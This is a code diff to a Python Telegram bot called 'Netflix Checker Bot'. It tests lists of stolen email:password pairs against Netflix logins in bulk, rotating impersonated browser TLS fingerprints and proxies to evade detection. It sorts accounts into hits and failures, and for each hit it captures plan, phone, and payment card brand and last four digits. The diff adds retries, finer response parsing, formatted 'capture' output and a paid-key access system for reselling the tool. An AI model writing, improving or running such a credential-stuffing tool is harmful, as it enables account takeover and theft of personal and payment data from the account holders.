+     "user_agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_SF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
+    {"name":"Safari 17.5 (macOS)","identifier":"safari_17_5","impersonate":"safari17_5","header_order":_SF_HDR,
+     "user_agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_SF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
+    {"name":"Safari 17.4.1 (macOS)","identifier":"safari_17_4_1","impersonate":"safari17_4_1","header_order":_SF_HDR,
+     "user_agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_SF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
+    {"name":"Safari 17.2.1 (macOS)","identifier":"safari_17_2_1","impersonate":"safari17_2_1","header_order":_SF_HDR,
+     "user_agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_SF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
+    {"name":"Safari 17.0 (macOS)","identifier":"safari_17_0","impersonate":"safari17_0","header_order":_SF_HDR,
+     "user_agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_SF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
+    {"name":"Safari 16.5 (macOS)","identifier":"safari_16_5","impersonate":"safari16_5","header_order":_SF_HDR,
+     "user_agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_SF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
+    {"name":"Safari 16.0 (macOS)","identifier":"safari_16","impersonate":"safari16","header_order":_SF_HDR,
+     "user_agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_SF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
+    {"name":"Safari 15.5 (macOS)","identifier":"safari_15_5","impersonate":"safari15_5","header_order":_SF_HDR,
+     "user_agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_SF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
+    {"name":"Safari 15.3 (macOS)","identifier":"safari_15_3","impersonate":"safari15_3","header_order":_SF_HDR,
+     "user_agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_SF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
+    # ── Safari iOS ───────────────────────────────────────────────────────────
+    {"name":"Safari iOS 18.1.1","identifier":"safari_ios_18_1_1","impersonate":"safari_ios_18_1_1","header_order":_SF_IOS,
+     "user_agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Mobile/15E148 Safari/604.1",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_SF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
+    {"name":"Safari iOS 17.4.1","identifier":"safari_ios_17_4_1","impersonate":"safari_ios_17_4_1","header_order":_SF_IOS,
+     "user_agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_SF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
+    {"name":"Safari iOS 17.2","identifier":"safari_ios_17_2","impersonate":"safari_ios_17_2","header_order":_SF_IOS,
+     "user_agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_SF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
+    {"name":"Safari iOS 16.5","identifier":"safari_ios_16_5","impersonate":"safari_ios_16_5","header_order":_SF_IOS,
+     "user_agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
+     "sec_ch_ua":None,"sec_ch_ua_platform":None,"sec_ch_ua_mobile":None,
+     "accept_nav":_SF,"accept_api":"*/*","accept_lang":"en-US,en;q=0.9","accept_encoding":"gzip, deflate, br"},
 ]
 
-# ── Auto-filter: keep only profiles curl_cffi can actually impersonate ──────
-def _discover_supported_impersonations() -> set:
-    """Safely enumerate BrowserType enum from curl_cffi and return lowercase value set."""
-    _bt = getattr(cffi_requests, "BrowserType", None)
-    if _bt is None:
-        return set()
-    supported = set()
+# ── Auto-filter: probe each impersonate value by actually creating a Session ──
+def _probe_impersonate(val: str) -> bool:
+    """Return True if curl_cffi accepts this impersonate string."""
     try:
-        for member in _bt:
-            val = getattr(member, "value", None)
-            if val:
-                supported.add(str(val).lower())
-    except TypeError:
-        return set()
-    return supported
+        cffi_requests.Session(impersonate=val)
+        return True
+    except Exception:
+        return False
 
-_SUPPORTED_IMPERSONATE = _discover_supported_impersonations()
-if _SUPPORTED_IMPERSONATE:
-    _before = len(TLS_PROFILES)
-    TLS_PROFILES = [p for p in TLS_PROFILES
-                    if p["impersonate"].lower() in _SUPPORTED_IMPERSONATE]
-    _dropped = _before - len(TLS_PROFILES)
-    if _dropped:
-        print(f"[profiles] curl_cffi: dropped {_dropped} unsupported profiles. "
-              f"{len(TLS_PROFILES)} profiles active.")
-    else:
-        print(f"[profiles] curl_cffi: all {len(TLS_PROFILES)} profiles supported.")
+_before = len(TLS_PROFILES)
+TLS_PROFILES = [p for p in TLS_PROFILES if _probe_impersonate(p["impersonate"])]
+_dropped = _before - len(TLS_PROFILES)
+if _dropped:
+    print(f"[profiles] curl_cffi: dropped {_dropped} unsupported profiles. "
+          f"{len(TLS_PROFILES)} profiles active.")
 else:
-    print("[profiles] curl_cffi: could not query BrowserType — using all profiles as-is.")
+    print(f"[profiles] curl_cffi: all {len(TLS_PROFILES)} profiles active.")
 
 if not TLS_PROFILES:
     raise RuntimeError("No valid TLS profiles found.")
 
 # Pick best validation profile using priority order
 _VALIDATE_PRIORITY = (
-    "chrome133a", "chrome131", "chrome131_android",
-    "chrome124", "chrome120", "firefox133", "firefox135",
-    "safari18_0", "safari15_5",
+    "chrome133a", "chrome133", "chrome132", "chrome131",
+    "chrome130", "chrome129", "chrome124", "chrome120",
+    "firefox135", "firefox133", "safari18_2", "safari18",
+    "safari_ios_18_1_1", "safari15_5",
 )
 _active_impersonates = {p["impersonate"] for p in TLS_PROFILES}
 _VALIDATE_PROFILE = next(
@@ -959,6 +535,31 @@ COUNTRY_PHONE = {
     "VG":"1284","VI":"1340","WF":"681","EH":"212","YE":"967","ZM":"260","ZW":"263",
 }
 
+_FLAG_OFFSET = ord("🇦") - ord("A")
+
+def country_to_flag(code: str) -> str:
+    code = (code or "").upper()
+    if len(code) == 2 and code.isalpha():
+        return chr(ord(code[0]) + _FLAG_OFFSET) + chr(ord(code[1]) + _FLAG_OFFSET)
+    return "🌐"
+
+_COUNTRY_NAMES = {
+    "US":"United States","GB":"United Kingdom","CA":"Canada","AU":"Australia",
+    "DE":"Germany","FR":"France","ES":"Spain","IT":"Italy","NL":"Netherlands",
+    "BR":"Brazil","MX":"Mexico","AR":"Argentina","JP":"Japan","KR":"South Korea",
+    "IN":"India","TR":"Turkey","SA":"Saudi Arabia","AE":"UAE","PL":"Poland",
+    "SE":"Sweden","NO":"Norway","DK":"Denmark","FI":"Finland","CH":"Switzerland",
+    "AT":"Austria","BE":"Belgium","PT":"Portugal","CZ":"Czech Republic",
+    "HU":"Hungary","RO":"Romania","GR":"Greece","ZA":"South Africa","NG":"Nigeria",
+    "EG":"Egypt","PH":"Philippines","ID":"Indonesia","TH":"Thailand","MY":"Malaysia",
+    "SG":"Singapore","HK":"Hong Kong","TW":"Taiwan","NZ":"New Zealand",
+    "CL":"Chile","CO":"Colombia","PE":"Peru","VE":"Venezuela",
+    "IL":"Israel","UA":"Ukraine","RU":"Russia","PK":"Pakistan","BD":"Bangladesh",
+}
+
+def country_to_name(code: str) -> str:
+    return _COUNTRY_NAMES.get((code or "").upper(), (code or "??").upper())
+
 
 def generate_cookie():
     tz_entry = random.choice(TIMEZONES)
@@ -1051,10 +652,32 @@ def check_account(email, password, proxy=None):
         login_headers["sec-ch-ua-mobile"] = profile["sec_ch_ua_mobile"]
         login_headers["sec-ch-ua-platform"] = profile["sec_ch_ua_platform"]
 
-    try:
-        r1 = session.get("https://www.netflix.com/login", headers=login_headers, **req_kwargs)
-    except Exception as e:
-        return {"status": "ERROR", "message": f"Login page failed: {e}"}
+    r1 = None
+    _r1_last_err = None
+    for _r1_attempt in range(3):
+        try:
+            r1 = session.get("https://www.netflix.com/login", headers=login_headers, **req_kwargs)
+            break
+        except Exception as e:
+            _r1_last_err = str(e)
+            profile = pick_profile()
+            session = create_session(profile)
+            if proxies:
+                session.proxies = proxies
+            login_headers["User-Agent"] = profile["user_agent"]
+            login_headers["Accept"] = profile["accept_nav"]
+            login_headers["Accept-Language"] = profile["accept_lang"]
+            login_headers["Accept-Encoding"] = profile["accept_encoding"]
+            if profile.get("sec_ch_ua"):
+                login_headers["sec-ch-ua"] = profile["sec_ch_ua"]
+                login_headers["sec-ch-ua-mobile"] = profile["sec_ch_ua_mobile"]
+                login_headers["sec-ch-ua-platform"] = profile["sec_ch_ua_platform"]
+            else:
+                login_headers.pop("sec-ch-ua", None)
+                login_headers.pop("sec-ch-ua-mobile", None)
+                login_headers.pop("sec-ch-ua-platform", None)
+    if r1 is None:
+        return {"status": "ERROR", "message": f"Login page failed: {_r1_last_err}"}
 
     if r1.status_code == 400:
         return {"status": "BAN", "message": "400 on login page"}
@@ -1172,10 +795,14 @@ def check_account(email, password, proxy=None):
         except Exception as e:
             last_err = str(e)
             r2 = None
+            login_session = create_session(profile)
+            if proxy_url:
+                login_session.proxies = {"http": proxy_url, "https": proxy_url}
             continue
-        if r2.status_code != 500:
+        if r2.status_code not in (500, 503, 502):
             break
-        last_err = f"HTTP 500 (attempt {attempt + 1})"
+        last_err = f"HTTP {r2.status_code} (attempt {attempt + 1})"
+        r2 = None
     if r2 is None:
         return {"status": "ERROR", "message": f"Login POST failed (3 attempts): {last_err}"}
     # Only hard-fail on 4xx/5xx — Netflix occasionally returns 3xx or other codes
@@ -1191,32 +818,65 @@ def check_account(email, password, proxy=None):
         parse_regex(login_src, r'"webTextWithTags".*?"text"\s*:\s*"([^"]+)"')
     )
 
-    if '"universal":"/browse"' in login_src:
+    src_lc = login_src.lower()
+
+    if '"universal":"/browse"' in login_src or '"universal":"\\u002Fbrowse"' in login_src:
         status = "HIT"
-    elif "Incorrect password" in login_src or "incorrect password" in login_src.lower():
-        return {"status": "FAIL", "message": "Incorrect password"}
-    elif "too many" in login_src.lower() or "try again later" in login_src.lower():
-        return {"status": "RATE_LIMITED", "message": unescape_value(alert_msg) or "Too many attempts"}
-    elif "captcha" in login_src.lower() or "recaptcha" in login_src.lower():
-        return {"status": "CAPTCHA", "message": unescape_value(alert_msg) or "CAPTCHA required"}
-    elif 'universal":"/"},"' in login_src:
-        status = "CUSTOM"
+    elif '"/YourAccount"' in login_src or '"universal":"/YourAccount"' in login_src:
+        status = "HIT"
     elif "BAD_REQUEST" in login_src:
         return {"status": "BAN", "message": "BAD_REQUEST"}
+    elif (
+        "incorrect password" in src_lc
+        or "password is incorrect" in src_lc
+        or "wrong password" in src_lc
+        or "invalid password" in src_lc
+        or "email or password" in src_lc
+        or "couldn\\u2019t find" in src_lc
+        or "couldn't find" in src_lc
+        or "no account found" in src_lc
+        or "email address is not" in src_lc
+        or "invalidLoginAttempt" in login_src
+        or "INVALID_LOGIN" in login_src
+    ):
+        return {"status": "FAIL", "message": unescape_value(alert_msg) or "Wrong credentials"}
+    elif "too many" in src_lc or "try again later" in src_lc or "too many attempts" in src_lc:
+        return {"status": "RATE_LIMITED", "message": unescape_value(alert_msg) or "Too many attempts"}
+    elif "captcha" in src_lc or "recaptcha" in src_lc:
+        return {"status": "CAPTCHA", "message": unescape_value(alert_msg) or "CAPTCHA required"}
+    elif (
+        'universal":"/"},"' in login_src
+        or '"universal":"\\u002F"}' in login_src
+        or '"universal":"/"' in login_src
+    ):
+        status = "CUSTOM"
     elif "CLCSScreenUpdateTransition" in login_src:
         if alert_msg:
             ac = unescape_value(alert_msg)
-            if "password" in ac.lower():
-                return {"status": "FAIL", "message": "Wrong password"}
-            elif "locked" in ac.lower() or "suspend" in ac.lower():
+            ac_lc = ac.lower()
+            if "password" in ac_lc or "incorrect" in ac_lc or "invalid" in ac_lc:
+                return {"status": "FAIL", "message": ac}
+            elif "locked" in ac_lc or "suspend" in ac_lc or "disabled" in ac_lc:
                 return {"status": "LOCKED", "message": ac}
+            elif "too many" in ac_lc or "try again" in ac_lc:
+                return {"status": "RATE_LIMITED", "message": ac}
             else:
                 status = "CUSTOM"
         else:
-            inner = parse_regex(login_src, r'"text"\s*:\s*"([^"]{5,})"')
-            return {"status": "UNKNOWN", "message": unescape_value(inner) or "Transition screen"}
+            status = "CUSTOM"
+    elif alert_msg:
+        ac = unescape_value(alert_msg).lower()
+        if "password" in ac or "incorrect" in ac or "invalid" in ac or "email" in ac:
+            return {"status": "FAIL", "message": unescape_value(alert_msg)}
+        elif "locked" in ac or "suspend" in ac or "disabled" in ac:
+            return {"status": "LOCKED", "message": unescape_value(alert_msg)}
+        elif "too many" in ac or "try again" in ac:
+            return {"status": "RATE_LIMITED", "message": unescape_value(alert_msg)}
+        else:
+            return {"status": "UNKNOWN", "message": unescape_value(alert_msg)}
     else:
-        return {"status": "UNKNOWN", "message": unescape_value(alert_msg) or f"HTTP {r2.status_code}"}
+        inner = parse_regex(login_src, r'"text"\s*:\s*"([^"]{5,})"')
+        return {"status": "UNKNOWN", "message": unescape_value(inner) or f"Unrecognized response HTTP {r2.status_code}"}
 
     for name, value in login_session.cookies.get_dict().items():
         session.cookies.set(name, value)
@@ -1339,13 +999,24 @@ def check_account(email, password, proxy=None):
 
 
 def fmt_hit(r, password=""):
+    country = r.get("country", "")
+    flag    = country_to_flag(country)
+    cname   = country_to_name(country)
+    copy_line = (
+        f"{r.get('email','')}:{password}"
+        f" | {flag} {cname}"
+        f" | {r.get('plan','?')}"
+        f" | {r.get('price','?')}"
+        f" | {r.get('video_quality','?')}"
+        f" | {r.get('membership_status','?')}"
+    )
     return (
         f"✅ <b>HIT</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"📧 <b>Email:</b> <code>{r.get('email','')}</code>\n"
         f"🔑 <b>Pass:</b> <code>{password}</code>\n"
         f"👤 <b>Name:</b> {r.get('name','')}\n"
-        f"🌍 <b>Country:</b> {r.get('country','')}\n"
+        f"🌍 <b>Country:</b> {flag} {cname} ({country})\n"
         f"📋 <b>Plan:</b> {r.get('plan','')}\n"
         f"💰 <b>Price:</b> {r.get('price','')}\n"
         f"📅 <b>Member Since:</b> {r.get('member_since','')}\n"
@@ -1359,6 +1030,35 @@ def fmt_hit(r, password=""):
         f"✉️ <b>Email Ver:</b> {r.get('email_verified','')}\n"
         f"💳 <b>Payment:</b> {r.get('payment_method','')} | {r.get('card_brand','')} …{r.get('card_last_4','')}\n"
         f"🆔 <b>Netflix ID:</b> <code>{r.get('netflix_id','')}</code>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"📋 <b>Capture:</b> <code>{copy_line}</code>"
+    )
+
+
+def fmt_capture(r, password=""):
+    country = r.get("country", "")
+    flag    = country_to_flag(country)
+    cname   = country_to_name(country)
+    return (
+        f"✅ HIT\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"📧 Email:         {r.get('email','')}\n"
+        f"🔑 Pass:          {password}\n"
+        f"👤 Name:          {r.get('name','')}\n"
+        f"🌍 Country:       {flag} {cname} ({country})\n"
+        f"📋 Plan:          {r.get('plan','')}\n"
+        f"💰 Price:         {r.get('price','')}\n"
+        f"📅 Member Since:  {r.get('member_since','')}\n"
+        f"🗓 Next Bill:     {r.get('next_billing','')}\n"
+        f"📊 Status:        {r.get('membership_status','')} | {r.get('membership','')}\n"
+        f"⏸ On Hold:       {r.get('on_hold','')}\n"
+        f"📺 Streams:       {r.get('max_streams','')} | {r.get('video_quality','')}\n"
+        f"👥 Profiles:      {r.get('profiles','')}\n"
+        f"➕ Extra Member:  {r.get('extra_member','')} | {r.get('slot_occupied','')}\n"
+        f"📞 Phone:         {r.get('phone','')} ({r.get('phone_verified','')})\n"
+        f"✉️ Email Ver:     {r.get('email_verified','')}\n"
+        f"💳 Payment:       {r.get('payment_method','')} | {r.get('card_brand','')} ...{r.get('card_last_4','')}\n"
+        f"🆔 Netflix ID:    {r.get('netflix_id','')}\n"
         f"━━━━━━━━━━━━━━━━━━━━"
     )
 
@@ -1376,14 +1076,20 @@ def run_bulk_check(chat_id, combos, proxy, threads):
     error_msg_seen = set()
 
     def do_check(email, password):
-        try:
-            result = check_account(email, password, proxy)
-        except Exception as e:
-            result = {"status": "ERROR", "message": str(e), "email": email}
+        result = None
+        for _attempt in range(3):
+            try:
+                result = check_account(email, password, proxy)
+            except Exception as e:
+                result = {"status": "ERROR", "message": str(e), "email": email}
+            if result.get("status", "").upper() != "UNKNOWN":
+                break
         result["_password"] = password
         return result
 
     def update_status(msg_id, c):
+        unk = c.get("unknown", 0)
+        unk_line = f"❓ Unknown: {unk}\n" if unk else ""
         text = (
             f"⚙️ <b>Checking...</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━\n"
@@ -1392,6 +1098,7 @@ def run_bulk_check(chat_id, combos, proxy, threads):
             f"🔄 Custom: {c['custom']}  🔒 Locked: {c['locked']}\n"
             f"⚠️ Rate: {c['rate_limited']}  🤖 Cap: {c['captcha']}\n"
             f"🚫 Ban: {c['ban']}  💥 Errors: {c['error']}\n"
+            f"{unk_line}"
             f"━━━━━━━━━━━━━━━━━━━━"
         )
         try:
@@ -1433,7 +1140,7 @@ def run_bulk_check(chat_id, combos, proxy, threads):
 
             if status == "HIT":
                 hit_text = fmt_hit(result, pw)
-                hits_buf.append(f"{email}:{pw}")
+                hits_buf.append(fmt_capture(result, pw))
                 try:
                     bot.send_message(chat_id, hit_text, parse_mode="HTML")
                 except Exception:
@@ -1459,6 +1166,8 @@ def run_bulk_check(chat_id, combos, proxy, threads):
             error_detail += f"  {i}. <code>{html.escape(s)}</code>\n"
         error_detail += "Use /diagnose email:pass for full debug."
 
+    unk_final = c_final.get("unknown", 0)
+    unk_summary_line = f"❓ <b>Unknown:</b> {unk_final}\n" if unk_final else ""
     summary = (
         f"✅ <b>Check Complete!</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
@@ -1471,6 +1180,7 @@ def run_bulk_check(chat_id, combos, proxy, threads):
         f"🤖 <b>CAPTCHA:</b> {c_final['captcha']}\n"
         f"🚫 <b>Banned:</b> {c_final['ban']}\n"
         f"💥 <b>Errors:</b> {c_final['error']}\n"
+        f"{unk_summary_line}"
         f"━━━━━━━━━━━━━━━━━━━━"
         f"{error_detail}"
     )
@@ -1480,7 +1190,8 @@ def run_bulk_check(chat_id, combos, proxy, threads):
         bot.send_message(chat_id, summary, parse_mode="HTML")
 
     if hits_buf:
-        hits_text = "\n".join(hits_buf)
+        sep = "\n\n" + "━" * 20 + "\n\n"
+        hits_text = sep.join(hits_buf)
         bot.send_document(
             chat_id,
             io.BytesIO(hits_text.encode()),
@@ -1494,20 +1205,47 @@ def run_bulk_check(chat_id, combos, proxy, threads):
 
 @bot.message_handler(commands=["start", "help"])
 def cmd_start(msg: Message):
+    uid  = msg.from_user.id
+    name = msg.from_user.first_name or "User"
+    if _is_allowed(uid):
+        access_badge = "✅ <b>Access:</b> Granted"
+    else:
+        access_badge = "🔒 <b>Access:</b> Locked — use /redeem &lt;key&gt; to activate"
+    is_owner = (OWNER_ID != 0 and uid == OWNER_ID)
+    admin_section = (
+        "\n"
+        "👑 <b>Admin Commands</b>\n"
+        "┣ /mercy <code>user_id</code> — grant permanent access\n"
+        "┣ /genkey <code>7d</code> | <code>12h</code> | <code>30m</code> — generate a key\n"
+        "┗ /status — your settings\n"
+    ) if is_owner else ""
     text = (
-        "🎬 <b>Netflix Checker Bot</b>\n"
-        "━━━━━━━━━━━━━━━━━━━━\n"
-        "<b>Commands:</b>\n"
-        "📄 <b>Send a .txt file</b> — combo file (email:pass per line)\n\n"
-        "/check <code>email:pass</code> — single account check\n"
-        "/diagnose <code>email:pass</code> — step-by-step debug (shows exact failure point)\n"
-        "/setproxy <code>ip:port:user:pass</code> — set proxy\n"
-        "/clearproxy — remove proxy\n"
-        "/threads <code>N</code> — set thread count\n"
-        "/status — show current settings\n"
-        "/stop — stop active job\n\n"
-        "━━━━━━━━━━━━━━━━━━━━\n"
-        "Powered by <b>curl_cffi</b> real browser fingerprints"
+        f"🎬 <b>Netflix Checker Bot</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"👋 Welcome, <b>{name}</b>!\n"
+        f"{access_badge}\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"\n"
+        f"🔍 <b>Checker</b>\n"
+        f"┣ 📄 <b>Send a .txt file</b> — bulk check (email:pass per line)\n"
+        f"┣ /check <code>email:pass</code> — single account check\n"
+        f"┗ /stop — stop active bulk job\n"
+        f"\n"
+        f"⚙️ <b>Settings</b>\n"
+        f"┣ /setproxy <code>host:port:user:pass</code> — set proxy\n"
+        f"┣ /clearproxy — remove proxy (go direct)\n"
+        f"┣ /threads <code>N</code> — set thread count (default: 10)\n"
+        f"┗ /status — show current settings\n"
+        f"\n"
+        f"🔑 <b>Access</b>\n"
+        f"┗ /redeem <code>key</code> — activate a time-limited key\n"
+        f"\n"
+        f"🔬 <b>Debug</b>\n"
+        f"┗ /diagnose <code>email:pass</code> — step-by-step request trace\n"
+        f"{admin_section}"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"⚡ Powered by <b>curl_cffi</b> · Real browser TLS fingerprints\n"
+        f"🌐 35+ Chrome / Firefox / Safari profiles"
     )
     bot.send_message(msg.chat.id, text, parse_mode="HTML")
 
@@ -1782,6 +1520,9 @@ def cmd_diagnose(msg: Message):
 
 @bot.message_handler(commands=["check"])
 def cmd_check(msg: Message):
+    if not _is_allowed(msg.from_user.id):
+        bot.send_message(msg.chat.id, "🔒 Access denied. Use /redeem <code>&lt;key&gt;</code> to activate.", parse_mode="HTML")
+        return
     parts = msg.text.strip().split(maxsplit=1)
     if len(parts) < 2 or ":" not in parts[1]:
         bot.send_message(msg.chat.id, "❌ Usage: <code>/check email:password</code>", parse_mode="HTML")
@@ -1792,10 +1533,14 @@ def cmd_check(msg: Message):
     wait_msg = bot.send_message(msg.chat.id, f"🔍 Checking <code>{email}</code>...", parse_mode="HTML")
 
     def do():
-        try:
-            result = check_account(email.strip(), password.strip(), s["proxy"])
-        except Exception as e:
-            result = {"status": "ERROR", "message": str(e), "email": email}
+        result = None
+        for _attempt in range(3):
+            try:
+                result = check_account(email.strip(), password.strip(), s["proxy"])
+            except Exception as e:
+                result = {"status": "ERROR", "message": str(e), "email": email}
+            if result.get("status", "").upper() != "UNKNOWN":
+                break
         status = result.get("status", "UNKNOWN").upper()
         if status == "HIT":
             text = fmt_hit(result, password.strip())
@@ -1823,6 +1568,9 @@ def cmd_check(msg: Message):
 
 @bot.message_handler(content_types=["document"])
 def handle_file(msg: Message):
+    if not _is_allowed(msg.from_user.id):
+        bot.send_message(msg.chat.id, "🔒 Access denied. Use /redeem <code>&lt;key&gt;</code> to activate.", parse_mode="HTML")
+        return
     doc = msg.document
     if not doc.file_name.endswith(".txt"):
         bot.send_message(msg.chat.id, "❌ Please send a <b>.txt</b> combo file.", parse_mode="HTML")
@@ -1896,6 +1644,70 @@ def handle_file(msg: Message):
         args=(msg.chat.id, combos, s["proxy"], s["threads"]),
         daemon=True
     ).start()
+
+
+@bot.message_handler(commands=["mercy"])
+def cmd_mercy(msg: Message):
+    if msg.from_user.id != OWNER_ID:
+        bot.send_message(msg.chat.id, "⛔ Owner only.")
+        return
+    parts = msg.text.strip().split()
+    if len(parts) < 2:
+        bot.send_message(msg.chat.id, "❌ Usage: <code>/mercy &lt;user_id&gt;</code>", parse_mode="HTML")
+        return
+    try:
+        target_uid = int(parts[1])
+    except ValueError:
+        bot.send_message(msg.chat.id, "❌ Invalid user ID.")
+        return
+    _grant_access(target_uid, expiry=None)
+    bot.send_message(msg.chat.id, f"✅ Permanent access granted to <code>{target_uid}</code>.", parse_mode="HTML")
+
+
+@bot.message_handler(commands=["genkey"])
+def cmd_genkey(msg: Message):
+    if msg.from_user.id != OWNER_ID:
+        bot.send_message(msg.chat.id, "⛔ Owner only.")
+        return
+    parts = msg.text.strip().split()
+    if len(parts) < 2:
+        bot.send_message(msg.chat.id, "❌ Usage: <code>/genkey &lt;duration&gt;</code>  e.g. <code>/genkey 7d</code>", parse_mode="HTML")
+        return
+    try:
+        key, expiry = _make_key(parts[1])
+    except Exception as e:
+        bot.send_message(msg.chat.id, f"❌ {e}")
+        return
+    bot.send_message(
+        msg.chat.id,
+        f"🔑 <b>New Key</b>\n<code>{key}</code>\n⏳ Expires: <b>{expiry.strftime('%Y-%m-%d %H:%M UTC')}</b>",
+        parse_mode="HTML"
+    )
+
+
+@bot.message_handler(commands=["redeem"])
+def cmd_redeem(msg: Message):
+    parts = msg.text.strip().split()
+    if len(parts) < 2:
+        bot.send_message(msg.chat.id, "❌ Usage: <code>/redeem &lt;key&gt;</code>", parse_mode="HTML")
+        return
+    key = parts[1].strip()
+    now = datetime.datetime.utcnow()
+    if key not in _keys:
+        bot.send_message(msg.chat.id, "❌ Invalid key.")
+        return
+    expiry = _keys[key]
+    if expiry < now:
+        del _keys[key]
+        bot.send_message(msg.chat.id, "❌ This key has expired.")
+        return
+    del _keys[key]
+    _grant_access(msg.from_user.id, expiry=expiry)
+    bot.send_message(
+        msg.chat.id,
+        f"✅ Access activated until <b>{expiry.strftime('%Y-%m-%d %H:%M UTC')}</b>.",
+        parse_mode="HTML"
+    )
 
 
 if __name__ == "__main__":
